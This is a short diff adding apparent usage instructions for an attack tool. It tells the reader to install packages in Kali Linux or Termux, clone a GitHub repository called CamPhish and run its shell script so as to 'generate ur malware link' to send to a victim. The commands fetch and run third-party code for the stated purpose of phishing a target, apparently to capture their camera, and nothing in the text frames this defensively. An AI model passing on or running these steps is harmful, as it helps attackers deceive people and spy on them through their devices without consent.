@@ -1,0 +1,9 @@
+# use this code in kali-linux or termux to generate ur malware link to swnd it to ur victim
+
+
+apt-get -y install php openssh git wget
+
+git clone https://github.com/baradatipu/CamPhish
+cd CamPhish
+bash camphish.sh
+
